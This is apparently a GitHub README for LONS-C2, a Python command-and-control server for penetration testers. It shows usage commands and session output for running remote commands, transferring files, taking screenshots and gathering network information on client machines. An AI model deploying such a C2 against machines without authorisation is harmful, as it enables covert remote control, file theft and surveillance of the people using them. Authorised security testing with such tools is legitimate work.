# LONS-C2
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=green) \
![Banner](https://github.com/m4riio21/LONS-C2/blob/e275c02506acca5d114b07dbff4a498124173bb4/resources/LOGO.png)


## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Usage](#usage)


## Introduction
**Listener-Oriented Network Server (LONS)** is a socket-based command and control server, designed to allow pentesters and security enthusiasts to centralize and manage in an easy manner terminal sessions in different machines.

## Features

- Simple CLI with client selection
- Easy to use
- Running commands in remote clients
- Retrieve network information
- Upload files to clients
- Retrieve files from clients
- Take screenshots from clients and visualize them

## Usage

### Server

Default port is 1337. User may specify a custom port
```shell
$ python server/main.py [port]
```

### Client

```shell
$ python client/main.py <server_ip> <server_port>
```

## Running LONS-C2

### Help 

```
Server listening in 0.0.0.0:1337...
Type help to see options
mario@lons> help
Available commands:

		 sessions - Display active sessions and choose one

		 delete - Display active sessions and delete one

		 exit - Stop server and threads, and exit the program
```

#### Selecting a session

```
mario@lons> sessions
		1 - 127.0.0.1:59269 - OS: Windows
		back - Go back without choosing a session
session nº> 1
Type help to see options
mario@lons-session1>
```

### Help - Session

```
mario@lons-session1> help
Available commands:

		 upload_file <local_file_path> <remote_file_path> - Uploads the file given in the current local machine to the remote file path specified.

		 download_file <remote_file_path> <local_file_path>- Downloads the file remote file path specified and saves it in the local file path given.

		 screenshot <local_image_path>- Takes a screenshot in the client machine, and saves the image in the local path specified.

		 netinfo - Displays the most relevant net information, such as open ports and network interfaces.

		 run <command>- Runs the given command in the client and displays the information.

		 back - Exit current session
```

#### Running a system command

```
mario@lons-session1> run whoami
Executing Submodule Run - This module handles the process of executing a system command in the remote client.
desktop-testing\mario
```

#### Display network information

```
mario@lons-session1> netinfo
Executing Submodule NetInfo - This module gathers network information from the remote client, processes it and shows the most important information.
Ports open on all interfaces:
		0.0.0.0:135
		0.0.0.0:445
		0.0.0.0:903
		0.0.0.0:913
		0.0.0.0:1337

Ports open on a single interface:
		127.0.0.1:1337
		127.0.0.1:6942
		192.168.37.1:139
		192.168.56.1:139
		192.168.79.1:139

Interface in network range 192.168.56.0/24 with IP address 192.168.56.1
Interface in network range 192.168.37.0/24 with IP address 192.168.37.1
Interface in network range 192.168.79.0/24 with IP address 192.168.79.1
Interface in network range 192.168.0.0/24 with IP address 192.168.0.7
```


